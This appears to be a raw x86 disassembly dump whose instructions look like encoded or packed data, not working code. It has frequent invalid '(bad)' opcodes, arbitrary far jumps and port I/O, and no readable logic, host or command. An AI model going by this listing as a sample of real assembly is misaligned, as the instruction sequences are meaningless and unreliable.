  41b073:	jg     0x41b008
  41b075:	dec    esi
  41b076:	or     eax,0xbab46353
  41b07b:	test   eax,0x614d5618
  41b080:	ss sub al,0x3d
  41b083:	sub    cl,dl
  41b085:	mov    ?,WORD PTR [esi-0x4e]
  41b088:	retf   0x68d1
  41b08b:	ins    BYTE PTR es:[edi],dx
  41b08c:	sub    dl,BYTE PTR [eax-0x53a84d59]
  41b092:	daa    
  41b093:	aaa    
  41b094:	call   0x45f7:0xffe074d4
  41b09b:	sahf   
  41b09c:	mov    eax,ds:0x4146e261
  41b0a1:	aam    0x6d
  41b0a3:	push   cs
  41b0a4:	jno    0x41b0b1
  41b0a6:	fistp  WORD PTR [eax+0x1134d1b4]
  41b0ac:	fcomp  DWORD PTR [edi]
  41b0ae:	mov    ds:0xe5f5aa4e,eax
  41b0b3:	mov    bh,0x55
  41b0b5:	or     eax,0xb3828dd7
  41b0ba:	sbb    eax,0xcefb6951
  41b0bf:	jo     0x41b055
  41b0c1:	rol    DWORD PTR [ebx-0xd5759b],1
  41b0c7:	push   cs
  41b0c8:	jb     0x41b0c2
  41b0ca:	push   ds
  41b0cb:	pop    ebp
  41b0cc:	mov    DWORD PTR [eax-0x45051881],ebp
  41b0d2:	mov    cl,0x4e
  41b0d4:	(bad)  
  41b0d5:	pop    esi
  41b0d6:	sub    ah,BYTE PTR [edi-0x3f]
  41b0d9:	push   ebx
  41b0da:	addr16 arpl di,bp
  41b0dd:	fwait
  41b0de:	cmp    BYTE PTR [ebx],dh
  41b0e0:	xor    BYTE PTR [esi-0x4a],0x71
  41b0e4:	in     eax,dx
  41b0e5:	std    
  41b0e6:	or     ebx,0x1f04ebb9
  41b0ec:	rol    cl,1
  41b0ee:	test   esi,0xbd1eefae
  41b0f4:	jge    0x41b0d8
  41b0f6:	lods   eax,DWORD PTR ds:[esi]
  41b0f7:	add    ecx,edx
  41b0f9:	jmp    0xe3252c84
  41b0fe:	das    
  41b0ff:	fst    DWORD PTR [esi]
  41b101:	in     al,dx
  41b102:	bound  ecx,QWORD PTR [eax-0x4ea457a1]
  41b108:	les    esi,FWORD PTR [ebx]
  41b10a:	int    0x85
  41b10c:	push   esp
  41b10d:	out    dx,eax
  41b10e:	ss popa 
  41b110:	xor    esp,DWORD PTR [eax]
  41b112:	mul    DWORD PTR [ecx-0x765401c0]
  41b118:	hlt    
  41b119:	pop    edx
  41b11a:	xchg   ah,al
  41b11c:	lds    esp,FWORD PTR [eax-0x6e]
  41b11f:	mov    ch,BYTE PTR [ebp-0x59]
  41b122:	imul   ebp,DWORD PTR [eax],0xe213dce1
  41b128:	mov    ch,0xe2
  41b12a:	idiv   ebp
  41b12c:	or     al,BYTE PTR [ecx-0x77]
  41b12f:	rcr    DWORD PTR [ebx-0xe],1
  41b132:	loopne 0x41b0e4
  41b134:	mov    eax,0x84aadf20
  41b139:	pop    esp
  41b13a:	dec    edx
  41b13b:	adc    eax,0x743c44b9
  41b140:	jle    0x41b165
  41b142:	or     ah,BYTE PTR [esi]
  41b144:	pop    esp
  41b145:	adc    ebx,esp
  41b147:	mov    eax,0x4fc88bdf
  41b14c:	hlt    
  41b14d:	cmp    ch,dh
  41b14f:	pop    eax
  41b150:	xor    BYTE PTR [ebx+eiz*4-0x45e4fc9a],dh
  41b157:	loop   0x41b15a
  41b159:	inc    edi
  41b15a:	addr16 sahf 
  41b15c:	test   BYTE PTR [ecx+0x40377f03],dl
  41b162:	repz push 0x8
  41b165:	repnz sub ch,BYTE PTR [edx+0x69d58690]
  41b16c:	inc    esp
  41b16d:	cmc    
  41b16e:	cmp    eax,0x8f5cfe7e
  41b173:	ins    DWORD PTR es:[edi],dx
  41b174:	rol    BYTE PTR [ecx+0xe],cl
  41b177:	mov    ebx,0xc95f351
  41b17c:	(bad)  
  41b17d:	cmp    ah,BYTE PTR [ebp+0x12]
  41b180:	(bad)  
  41b181:	xchg   DWORD PTR [ecx+edi*4+0x26ad0b05],edi
  41b188:	push   ebp
  41b189:	shl    DWORD PTR [edi],0x64
  41b18c:	mov    edi,0x159044fa
  41b191:	jo     0x41b157
  41b193:	aad    0x42
  41b195:	jb     0x41b1a5
  41b197:	ds ds ror ah,0xe1
  41b19c:	push   eax
  41b19d:	pop    es
  41b19e:	pop    es
  41b19f:	push   0x2c
  41b1a1:	adc    DWORD PTR [esi+0x47],0xffffff82
  41b1a5:	fs and edi,edx
  41b1a8:	inc    DWORD PTR [ebx+0x78c0b017]
  41b1ae:	(bad)  
  41b1af:	cs dec ebx
  41b1b1:	or     eax,0x36469289
  41b1b6:	rcl    DWORD PTR [esi+ebx*8+0x74e18ca3],1
  41b1bd:	push   esi
  41b1be:	es jae 0x41b1ab
  41b1c1:	jno    0x41b179
  41b1c3:	loopne 0x41b207
  41b1c5:	xor    al,0xa2
  41b1c7:	call   0x2e3151e0
  41b1cc:	mov    ch,0xb3
  41b1ce:	pop    esi
  41b1cf:	add    BYTE PTR [eax+0xd208f58],ah
  41b1d5:	arpl   WORD PTR [edx+0x36],dx
  41b1d8:	pop    ds
  41b1d9:	sub    ebp,edx
  41b1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1dc:	fcomp  DWORD PTR [esi]
  41b1de:	iret   
  41b1df:	lock xor dh,BYTE PTR [eax+ebp*1+0x55]
  41b1e4:	sub    bh,BYTE PTR [esi+0xd7ac3f4]
  41b1ea:	inc    edi
  41b1eb:	stos   DWORD PTR es:[edi],eax
  41b1ec:	mov    al,0x62
  41b1ee:	add    DWORD PTR [eax-0x25],eax
  41b1f1:	into   
  41b1f2:	retf   
  41b1f3:	dec    ecx
  41b1f4:	or     al,0x47
  41b1f6:	inc    ebp
  41b1f7:	dec    esp
  41b1f8:	cmp    edx,DWORD PTR [ebp+eax*1+0x1d]
  41b1fc:	push   edx
  41b1fd:	out    0x4b,eax
  41b1ff:	test   eax,0x88061193
  41b204:	adc    ecx,edi
  41b206:	jmp    0xcb72:0x1c8c98cd
  41b20d:	mov    bh,0xb8
  41b20f:	fiadd  WORD PTR [ebx]
  41b211:	ds inc edi
  41b213:	fidivr WORD PTR [edx-0x25f8239f]
  41b219:	rcr    BYTE PTR [edx],1
  41b21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b21c:	je     0x41b22b
  41b21e:	add    eax,0x548b7323
  41b223:	pop    edi
  41b224:	adc    bh,BYTE PTR [eax]
  41b226:	mov    BYTE PTR [eax],cl
  41b228:	xor    BYTE PTR ds:0x62475613,bh
  41b22e:	pop    ebp
  41b22f:	nop
  41b230:	pop    edi
  41b231:	(bad)  
  41b232:	call   0x92b0:0x42bf9c4
  41b239:	daa    
  41b23a:	xchg   esp,eax
  41b23b:	jge    0x41b2b2
  41b23d:	addr16 mov bh,0x13
  41b240:	jge    0x41b269
  41b242:	int3   
  41b243:	std    
  41b244:	dec    edx
  41b245:	lods   eax,DWORD PTR ds:[esi]
  41b246:	pop    ds
  41b247:	rcl    BYTE PTR [esi+eax*1-0x7f],0xc1
  41b24c:	mov    bl,0xcd
  41b24e:	mov    esp,edi
  41b250:	div    eax
  41b252:	in     eax,0x1f
  41b254:	fld    QWORD PTR cs:[esi+0x3a]
  41b258:	(bad)
  41b25c:	xchg   ecx,eax
  41b25d:	icebp  
  41b25e:	jle    0x41b235
  41b260:	mov    ch,0x37
  41b262:	sahf   
  41b263:	es push ss
  41b265:	xchg   BYTE PTR [ecx+0x68a627e6],ch
  41b26b:	sti    
  41b26c:	push   ss
  41b26d:	xchg   esi,eax
  41b26e:	icebp  
  41b26f:	std    
  41b270:	cmp    al,0x32
  41b272:	imul   esp,DWORD PTR es:[ecx-0x6cb5aeea],0xffffffd1
  41b27a:	ins    BYTE PTR es:[edi],dx
  41b27b:	push   ebp
  41b27c:	jbe    0x41b293
  41b27e:	enter  0x921c,0x78
  41b282:	push   es
  41b283:	bound  esp,QWORD PTR [ebx+ebx*1]
  41b286:	pushf  
  41b287:	inc    edx
  41b288:	mov    ebp,0xf2748979
  41b28d:	loope  0x41b2c3
  41b28f:	outs   dx,DWORD PTR ds:[esi]
  41b290:	scas   al,BYTE PTR es:[edi]
  41b291:	push   ecx
  41b292:	mov    ch,0x26
  41b294:	jge    0x41b2c2
  41b296:	xor    eax,0x5dee388e
  41b29b:	push   ds
  41b29c:	sbb    al,0x5d
  41b29e:	ret    0x2a09
  41b2a1:	icebp  
  41b2a2:	mov    ds,WORD PTR [esi+0x77]
  41b2a5:	and    bh,BYTE PTR [edi-0x45]
  41b2a8:	pop    edx
  41b2a9:	mov    ecx,cs
  41b2ab:	jns    0x41b28b
  41b2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ae:	xchg   BYTE PTR [ebp+0x7f],bl
  41b2b1:	fisubr DWORD PTR [ebp+0x4b0c804f]
  41b2b7:	cmp    eax,0xd37d0ee6
  41b2bc:	mov    bh,0x87
  41b2be:	xchg   edi,ebp
  41b2c0:	add    al,0xa
  41b2c2:	fcomip st,st(6)
  41b2c4:	sub    DWORD PTR [ebx+ebx*8],ebp
  41b2c7:	or     eax,0x6faea025
  41b2cc:	test   cl,ah
  41b2ce:	mov    cl,BYTE PTR [esi-0xad7cda5]
  41b2d4:	pop    eax
  41b2d5:	out    0xc5,eax
  41b2d7:	jno    0x41b333
  41b2d9:	(bad)  
  41b2da:	cli    
  41b2db:	push   eax
  41b2dc:	popa   
  41b2dd:	jge    0x41b327
  41b2df:	cmp    ebx,DWORD PTR [edi-0x4]
  41b2e2:	xchg   ecx,eax
  41b2e3:	jl     0x41b302
  41b2e5:	xor    ebx,DWORD PTR [ebx+0x78]
  41b2e8:	ficom  DWORD PTR [edi+0x1c]
  41b2eb:	or     al,0xce
  41b2ed:	sbb    DWORD PTR [edx],0x2af3857c
  41b2f3:	dec    edx
  41b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2f5:	jg     0x475d8695
  41b2fb:	int    0xfb
  41b2fd:	mov    edx,DWORD PTR [eax+esi*8-0x27]
  41b301:	out    0x23,al
  41b303:	out    dx,al
  41b304:	(bad)  
  41b305:	xchg   esp,eax
  41b306:	sti    
  41b307:	dec    esp
  41b308:	inc    edi
  41b309:	jne    0x41b31c
  41b30b:	fimul  DWORD PTR [ebp+0x17]
  41b30e:	add    DWORD PTR [ebx-0x5],edx
  41b311:	sbb    al,0x19
  41b313:	sub    al,0x8
  41b315:	dec    ebx
  41b316:	and    BYTE PTR [esi+eiz*4],bl
  41b319:	(bad)  [edx+0xd64f44d]
  41b31f:	push   es
  41b320:	pop    ds
  41b321:	cmp    eax,0x5cedd051
  41b326:	push   ss
  41b327:	sbb    bh,BYTE PTR [ebx]
  41b329:	stos   BYTE PTR es:[edi],al
  41b32a:	outs   dx,DWORD PTR ds:[esi]
  41b32b:	data16 movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41b32e:	out    0xeb,al
  41b330:	mov    edi,0x98fb6cdc
  41b335:	jmp    0x9a8c:0xdbe96f8c
  41b33c:	loop   0x41b357
  41b33e:	and    dl,0x6a
  41b341:	jno    0x41b385
  41b343:	jmp    0x41b3a7
  41b345:	aad    0x2a
  41b347:	or     edi,DWORD PTR ds:0x2d55f9e2
  41b34d:	mov    esi,0x7b81e27c
  41b352:	mov    esp,0x1663ae35
  41b357:	push   ebx
  41b358:	or     BYTE PTR [ecx+0x76],dh
  41b35b:	loop   0x41b36e
  41b35d:	addr16 in eax,dx
  41b35f:	sbb    ebp,DWORD PTR [edx+0xb360be1]
  41b365:	or     bh,ch
  41b367:	fcmovnbe st,st(6)
  41b369:	push   0x4b46dea
  41b36e:	inc    esi
  41b36f:	mov    eax,0x19c794e9
  41b374:	add    eax,0x9982dfa4
  41b379:	push   cs
  41b37a:	lea    ebx,[edx-0x742725bc]
  41b380:	(bad)  
  41b381:	loop   0x41b359
  41b383:	outs   dx,BYTE PTR ds:[esi]
  41b384:	aam    0x26
  41b386:	xor    eax,0x1c313b31
  41b38b:	mov    ds:0x6750a7a,al
  41b390:	pop    esp
  41b391:	ret    0x8ab9
  41b394:	dec    esi
  41b395:	repnz jmp 0x79ff:0x83b8d023
  41b39d:	jbe    0x41b3c3
  41b39f:	ins    BYTE PTR es:[edi],dx
  41b3a0:	or     al,BYTE PTR [esi]
  41b3a2:	fwait
  41b3a3:	mov    edi,0x9d88426f
  41b3a8:	jmp    DWORD PTR [edx-0x5db8f681]
  41b3ae:	shl    WORD PTR [edx],1
  41b3b1:	mov    al,ds:0x117f2395
  41b3b6:	fisubr DWORD PTR [ebx]
  41b3b8:	sub    al,0x3d
  41b3ba:	jmp    0xf5e65828
  41b3bf:	gs in  al,0xa8
  41b3c2:	jno    0x41b39f
  41b3c4:	inc    edx
  41b3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3c6:	jp     0x41b384
  41b3c8:	push   cs
  41b3c9:	push   es
  41b3ca:	inc    ecx
  41b3cb:	stos   BYTE PTR es:[edi],al
  41b3cc:	mov    bh,0x31
  41b3ce:	and    bh,BYTE PTR [ebp-0x12e8a026]
  41b3d4:	jp     0x41b3c8
  41b3d6:	lds    edi,FWORD PTR [esi+0x27c68f7a]
  41b3dc:	in     al,dx
  41b3dd:	js     0x41b363
  41b3df:	(bad)  
  41b3e0:	pop    ss
  41b3e1:	mov    BYTE PTR [edx+eiz*4],dl
  41b3e4:	pop    ebx
  41b3e5:	and    cl,BYTE PTR [ebx+ecx*1+0x6f89044a]
  41b3ec:	sbb    DWORD PTR [edx-0x3f],edi
  41b3ef:	int3   
  41b3f0:	and    ch,BYTE PTR [eax-0x4e]
  41b3f3:	mov    ch,0x76
  41b3f5:	aaa    
  41b3f6:	test   eax,0x6d7ae2f3
  41b3fb:	mov    ds:0x5bb471a5,al
  41b400:	out    dx,eax
  41b401:	add    DWORD PTR [eax],ecx
  41b403:	jp     0x41b3cb
  41b405:	shl    BYTE PTR [edi-0x8f10b68],1
  41b40b:	mov    dh,0xba
  41b40d:	or     eax,0xc290937c
  41b412:	mov    ds:0x88b5ede6,eax
  41b417:	cmc    
  41b418:	loopne 0x41b495
  41b41a:	neg    esp
  41b41c:	inc    ebp
  41b41d:	adc    eax,0xff449601
  41b422:	and    BYTE PTR [eax],cl
  41b424:	les    ecx,FWORD PTR [ebx+0x6b]
  41b427:	lea    ebx,[ebp-0x6d9d94c0]
  41b42d:	aas    
  41b42e:	sbb    esi,ebx
  41b430:	sahf   
  41b431:	jmp    0xccea2c5a
  41b436:	rcr    DWORD PTR [ebp+eax*4-0x29],0xc2
  41b43b:	jmp    0xc376:0x84d2261f
  41b442:	xor    dl,BYTE PTR [edx-0x64]
  41b445:	(bad)  
  41b446:	mov    al,0xe1
  41b448:	cmp    eax,0xb87ce410
  41b44d:	stos   DWORD PTR es:[edi],eax
  41b44e:	mov    edi,0x1cd9b9b5
  41b453:	popf   
  41b454:	dec    edx
  41b455:	sbb    eax,0x1ac677c2
  41b45a:	popf   
  41b45b:	mov    ah,0xc7
  41b45d:	cmp    al,0x13
  41b45f:	ja     0x41b41f
  41b461:	pop    esi
  41b462:	mov    eax,ebp
  41b464:	jae    0x41b451
  41b466:	popa   
  41b467:	sbb    eax,0xd2e8cb9
  41b46c:	fcmovnb st,st(6)
  41b46e:	inc    ebp
  41b46f:	ins    DWORD PTR es:[edi],dx
  41b470:	movaps xmm6,XMMWORD PTR [eax-0x4ccc414a]
  41b477:	les    ebx,FWORD PTR [esi-0x48]
  41b47a:	fs lahf 
  41b47c:	inc    esp
  41b47d:	and    al,BYTE PTR [ecx+0x48]
  41b480:	cwde   
  41b481:	mov    ecx,0x465a9fa3
  41b486:	stc    
  41b487:	mov    edi,0xfdf521a
  41b48c:	(bad)  
  41b48d:	sbb    eax,0x3cdb198d
  41b492:	push   esp
  41b493:	popf   
  41b494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b495:	nop
  41b496:	jmp    FWORD PTR [edx+0x7d]
  41b499:	les    ecx,FWORD PTR ds:0x908a5423
  41b49f:	loop   0x41b464
  41b4a1:	or     eax,0x25dbc8b1
  41b4a6:	mov    edi,0x5c797900
  41b4ab:	fisub  DWORD PTR [ecx+0x65]
  41b4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4af:	pop    es
  41b4b0:	pop    es
  41b4b1:	rol    BYTE PTR [edi-0x6e580e09],cl
  41b4b7:	mov    ds:0x46540979,al
  41b4bc:	fiadd  WORD PTR [ebx+0x4fed5563]
  41b4c2:	fs pop esi
  41b4c4:	xchg   edx,eax
  41b4c5:	shr    DWORD PTR [edx],cl
  41b4c7:	add    BYTE PTR [ecx+0x21],cl
  41b4ca:	mov    dl,0xb8
  41b4cc:	pop    ecx
  41b4cd:	mov    dl,0x41
  41b4cf:	inc    edx
  41b4d0:	adc    ebx,DWORD PTR [edi]
  41b4d2:	pop    esp
  41b4d3:	leave  
  41b4d4:	jo     0x41b469
  41b4d6:	inc    edi
  41b4d7:	ja     0x41b4a3
  41b4d9:	stos   BYTE PTR es:[edi],al
  41b4da:	cmp    esi,DWORD PTR [ecx+edi*4+0x24c175c]
  41b4e1:	pop    ecx
  41b4e2:	or     eax,0xa63354d3
  41b4e7:	imul   esi,DWORD PTR [eax],0x41
  41b4ea:	loopne 0x41b470
  41b4ec:	sub    eax,0x28ee32c7
  41b4f1:	call   0xc521e431
  41b4f6:	mov    esp,0x710fdd07
  41b4fb:	mov    ds:0x9ce65f19,al
  41b500:	push   edx
  41b501:	cld    
  41b502:	xchg   edi,eax
  41b503:	cmp    DWORD PTR [edi+0x18],esp
  41b506:	out    0xca,al
  41b508:	in     eax,dx
  41b509:	icebp  
  41b50a:	out    0x7d,al
  41b50c:	pusha  
  41b50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50e:	aaa    
  41b50f:	xor    DWORD PTR [edi-0x47b23b70],edi
  41b515:	push   ecx
  41b516:	dec    ecx
  41b517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b518:	adc    al,0xe1
  41b51a:	inc    esi
  41b51b:	ds jb  0x41b513
  41b51e:	mov    esp,0xf72cd302
  41b523:	loop   0x41b508
  41b525:	call   0x45dd06f2
  41b52a:	push   DWORD PTR [esi+0x3b7b06cf]
  41b530:	in     eax,dx
  41b531:	mov    BYTE PTR [ebx+0x65],dh
  41b534:	mov    cl,0x9a
  41b536:	les    esp,FWORD PTR [ebp-0x9bd55dc]
  41b53c:	je     0x41b4e4
  41b53e:	aaa    
  41b53f:	pop    ebp
  41b540:	sbb    DWORD PTR [edi],0x1a013430
  41b546:	push   es
  41b547:	mov    al,0x8e
  41b549:	lock mov esi,0xfaceaed6
  41b54f:	jnp    0x41b57e
  41b551:	ins    BYTE PTR es:[edi],dx
  41b552:	imul   DWORD PTR [ebp+0x4f]
  41b555:	cs pop edx
  41b557:	sub    ebx,edx
  41b559:	mov    ah,0x76
  41b55b:	lods   al,BYTE PTR ds:[esi]
  41b55c:	mov    ch,BYTE PTR [edx-0x33]
  41b55f:	jae    0x41b525
  41b561:	adc    eax,0x6d459d4
  41b566:	push   eax
  41b567:	dec    esi
  41b568:	nop
  41b569:	aas    
  41b56a:	nop
  41b56b:	pop    ebx
  41b56c:	adc    BYTE PTR [edx-0x7a],bl
  41b56f:	and    al,0xbc
  41b571:	std    
  41b572:	push   ebp
  41b573:	push   0x8849ea98
  41b578:	ds xor ecx,esi
  41b57b:	sub    dh,BYTE PTR [eax-0x60d8f3ed]
  41b581:	push   ebp
  41b582:	stc    
  41b583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b584:	aas    
  41b585:	xor    al,0x79
  41b587:	fnstenv ss:[edx+0x6dcef20a]
  41b58e:	or     al,0x3b
  41b590:	jmp    0xca0089e1
  41b595:	scas   eax,DWORD PTR es:[edi]
  41b596:	lods   eax,DWORD PTR ds:[esi]
  41b597:	sbb    al,0xc7
  41b599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b59a:	sub    DWORD PTR [edi],edi
  41b59c:	mov    ?,WORD PTR [edx]
  41b59e:	fwait
  41b59f:	add    al,0x67
  41b5a1:	rcr    DWORD PTR [ebp-0x728fab8b],1
  41b5a7:	popa   
  41b5a8:	dec    eax
  41b5a9:	jg     0x41b604
  41b5ab:	jp     0x41b62a
  41b5ad:	push   ecx
  41b5ae:	xor    bl,bh
  41b5b0:	popf   
  41b5b1:	mov    WORD PTR [ebx+0x5],gs
  41b5b4:	inc    ebp
  41b5b5:	and    eax,0x5bd3e452
  41b5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5bb:	shl    DWORD PTR [ecx+ebx*2+0x44],1
  41b5bf:	stos   DWORD PTR es:[edi],eax
  41b5c0:	mov    ebx,0x3aafe62f
  41b5c5:	ret    
  41b5c6:	xchg   DWORD PTR [ecx+esi*8],ebp
  41b5c9:	mov    al,0x7c
  41b5cb:	in     al,0xd2
  41b5cd:	sub    eax,0xe76aff47
  41b5d2:	push   ss
  41b5d3:	sbb    BYTE PTR [edx-0x5f],ah
  41b5d6:	ja     0x41b5e0
  41b5d8:	(bad)  
  41b5d9:	jae    0x41b642
  41b5db:	cs in  eax,0x4
  41b5de:	inc    edi
  41b5df:	dec    ebx
  41b5e0:	jbe    0x41b570
  41b5e2:	and    dl,BYTE PTR [ecx]
  41b5e4:	mov    ah,0x50
  41b5e6:	stos   DWORD PTR es:[edi],eax
  41b5e7:	fistp  QWORD PTR [ebp-0xde8109e]
  41b5ed:	(bad)  
  41b5ee:	sub    ch,bh
  41b5f0:	(bad)  
  41b5f1:	not    DWORD PTR [eax]
  41b5f3:	rol    BYTE PTR [ebx+0x45b9b610],1
  41b5f9:	adc    DWORD PTR [ebx+0xe],edi
  41b5fc:	xor    eax,0x9c023783
  41b601:	fnstenv [edx+eax*8+0x351a824a]
  41b608:	in     al,dx
  41b609:	xlat   BYTE PTR ds:[ebx]
  41b60a:	mov    DWORD PTR [ebx-0x4a00cc7c],esi
  41b610:	iret   
  41b611:	mov    ch,0x7d
  41b613:	mov    BYTE PTR [esi-0x6c],ch
  41b616:	cmp    al,BYTE PTR [ecx-0x76]
  41b619:	in     al,0x2c
  41b61b:	mov    ah,0x43
  41b61d:	mov    ah,0xe1
  41b61f:	mov    esp,0x5c17306
  41b624:	ss adc eax,0xaa09ae3c
  41b62a:	jecxz  0x41b5c1
  41b62c:	in     al,dx
  41b62d:	jns    0x41b6a1
  41b62f:	jg     0x41b5d8
  41b631:	mov    esi,0xa7eac8f5
  41b636:	es jo  0x41b601
  41b639:	stc    
  41b63a:	cdq    
  41b63b:	shl    BYTE PTR [ecx],0xb1
  41b63e:	cmp    al,0xd1
  41b640:	inc    esp
  41b641:	mov    bh,0x7d
  41b643:	sub    eax,0x1ef72916
  41b648:	xchg   BYTE PTR [esi+0x34696506],dl
  41b64e:	push   cs
  41b64f:	or     dh,BYTE PTR [ebp+eax*2-0x72]
  41b653:	stc    
  41b654:	or     DWORD PTR [ebp+esi*2-0x31],edi
  41b658:	pop    ss
  41b659:	mov    ds:0x97e9f18b,al
  41b65e:	or     ebx,DWORD PTR [edi-0x66a6cca2]
  41b664:	mov    ds:0x298c74df,eax
  41b669:	mov    ebx,0x3aa4f7d0
  41b66e:	int3   
  41b66f:	addr16 push cs
  41b671:	cmp    esi,ebp
  41b673:	push   ebp
  41b674:	mov    al,0x2
  41b676:	fs aam 0xf9
  41b679:	out    0xd9,al
  41b67b:	shl    BYTE PTR [edx-0x15],0x56
  41b67f:	(bad)  
  41b681:	adc    eax,0xa1d8a6b0
  41b686:	sbb    BYTE PTR [edx],dl
  41b688:	(bad)  
  41b689:	loope  0x41b634
  41b68b:	aad    0x2b
  41b68d:	add    al,0xeb
  41b68f:	lock cmp BYTE PTR [esi-0x5c],bh
  41b693:	les    ebp,FWORD PTR [esi+eiz*8+0x35]
  41b697:	lods   al,BYTE PTR ds:[esi]
  41b698:	cmp    DWORD PTR [edx-0x60],esp
  41b69b:	or     DWORD PTR ds:0xde0c5cca,esp
  41b6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a2:	addr16 add cl,dh
  41b6a5:	push   0xffffffce
  41b6a7:	push   ds
  41b6a8:	lods   al,BYTE PTR ds:[esi]
  41b6a9:	mov    ecx,0x8ead17e7
  41b6ae:	mov    cs,ecx
  41b6b0:	cmp    eax,0x5e9d76af
  41b6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b6:	ins    DWORD PTR es:[edi],dx
  41b6b7:	or     al,0xd1
  41b6b9:	(bad)  
  41b6ba:	push   esp
  41b6bb:	(bad)  
  41b6bc:	jmp    0x97ee:0x2323c041
  41b6c3:	cmp    esi,0xffffffb2
  41b6c6:	gs imul ebp,edi,0x28
  41b6ca:	daa    
  41b6cb:	push   edx
  41b6cc:	sub    DWORD PTR [edi-0x45],ebp
  41b6cf:	inc    ecx
  41b6d0:	push   0x21
  41b6d2:	push   ecx
  41b6d3:	jl     0x41b678
  41b6d5:	mov    edx,0x4a7af964
  41b6da:	push   ss
  41b6db:	mov    eax,DWORD PTR [edx+esi*2]
  41b6de:	fstp   st(7)
  41b6e0:	cmc    
  41b6e1:	(bad)  
  41b6e2:	pop    ds
  41b6e3:	inc    esi
  41b6e4:	sbb    al,0x88
  41b6e6:	arpl   bx,cx
  41b6e8:	lods   eax,DWORD PTR ds:[esi]
  41b6e9:	(bad)  
  41b6ea:	outs   dx,DWORD PTR ds:[esi]
  41b6eb:	or     dh,BYTE PTR [edi-0x3e]
  41b6ee:	xor    al,0x47
  41b6f0:	ror    DWORD PTR [bp+si-0x3a92],1
  41b6f5:	lds    edi,FWORD PTR [edx+0x44bfea39]
  41b6fb:	jb     0x41b706
  41b6fd:	mov    esi,0xeef1727e
  41b702:	enter  0x3a5b,0x3
  41b706:	push   cs
  41b707:	imul   edi
  41b709:	pop    ss
  41b70a:	gs fcomip st,st(5)
  41b70d:	sub    BYTE PTR [ebp-0x70],0x4
  41b711:	lock into 
  41b713:	xchg   ebp,eax
  41b714:	cmp    DWORD PTR [bx+si+0x3f82],esi
  41b719:	mov    ebp,DWORD PTR [ecx]
  41b71b:	mov    edi,0x2598594a
  41b720:	shl    eax,cl
  41b722:	xchg   ebx,eax
  41b723:	addr16 aam 0x79
  41b726:	fmul   DWORD PTR [esi+edi*4]
  41b729:	fucomi st,st(0)
  41b72b:	test   eax,0x6bad9bd6
  41b730:	adc    cl,dh
  41b732:	mov    ebp,0x96431571
  41b737:	adc    BYTE PTR [ebp-0x1e8270b8],dh
  41b73d:	xchg   esi,eax
  41b73e:	inc    eax
  41b73f:	jnp    0x41b769
  41b741:	pop    esp
  41b742:	lods   eax,DWORD PTR ds:[esi]
  41b743:	or     BYTE PTR [edi-0x4e734e59],ah
  41b749:	jl     0x41b77d
  41b74b:	sahf   
  41b74c:	mov    ebp,0xb28796
  41b751:	pop    ds
  41b752:	inc    esp
  41b753:	mov    eax,0x4ce49a5e
  41b758:	in     eax,dx
  41b759:	sub    ebx,edi
  41b75b:	cmp    BYTE PTR cs:[ecx+edx*1+0x32],dl
  41b760:	mov    edx,0xbb74a220
  41b765:	or     eax,0x17c2a4b6
  41b76a:	pop    ebp
  41b76b:	stos   DWORD PTR es:[edi],eax
  41b76c:	inc    edi
  41b76d:	es jmp 0x8a94a302
  41b773:	pop    ebp
  41b774:	or     esp,ecx
  41b776:	enter  0x68f8,0xb5
  41b77a:	xlat   BYTE PTR ds:[ebx]
  41b77b:	ins    BYTE PTR es:[edi],dx
  41b77c:	(bad)  
  41b77e:	sub    DWORD PTR [ecx],esp
  41b780:	and    edi,DWORD PTR [ecx+0x50]
  41b783:	cli    
  41b784:	jmp    0x44a2:0xa61a636a
  41b78b:	lods   al,BYTE PTR ds:[esi]
  41b78c:	in     al,dx
  41b78d:	and    cl,ch
  41b78f:	push   0x7e
  41b791:	cmp    ebx,DWORD PTR [edi]
  41b793:	adc    al,0x24
  41b795:	rcr    ebp,1
  41b797:	or     eax,esi
  41b799:	fcomp  DWORD PTR [ebx]
  41b79b:	mov    bh,0xde
  41b79d:	push   ecx
  41b79e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b79f:	xor    eax,0xc7c06d9b
  41b7a4:	push   0xffffffbd
  41b7a6:	out    dx,eax
  41b7a7:	adc    esp,ecx
  41b7a9:	xor    eax,DWORD PTR [ebp-0x45]
  41b7ac:	or     DWORD PTR ds:0x6f9de964,eax
  41b7b2:	pop    ebp
  41b7b3:	mov    BYTE PTR [ebp-0x64],dl
  41b7b6:	jmp    0xea19:0x80a44b3f
  41b7bd:	jmp    0x41813d0e
  41b7c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7c3:	mov    edx,0xb9fd0bb3
  41b7c8:	xlat   BYTE PTR ds:[ebx]
  41b7c9:	mov    al,0x4c
  41b7cb:	mov    BYTE PTR [edi+0x17],0x6d
  41b7cf:	repz fcom QWORD PTR [ebx]
  41b7d2:	je     0x41b784
  41b7d4:	pusha  
  41b7d5:	ret    0xaff9
  41b7d8:	sub    DWORD PTR [edx+edx*8-0x62ba9e78],0x19
  41b7e0:	ins    BYTE PTR es:[edi],dx
  41b7e1:	mov    DWORD PTR [edi],edx
  41b7e3:	xchg   ebp,eax
  41b7e4:	int    0x31
  41b7e6:	xchg   BYTE PTR [ebp-0x5c],dh
  41b7e9:	ficomp DWORD PTR [eax+0x73b5d964]
  41b7ef:	daa    
  41b7f0:	inc    eax
  41b7f1:	jmp    FWORD PTR [ecx]
  41b7f3:	div    DWORD PTR [eax]
  41b7f5:	call   0x7b15a90a
  41b7fa:	cmp    BYTE PTR [ebp-0x5f],0xf6
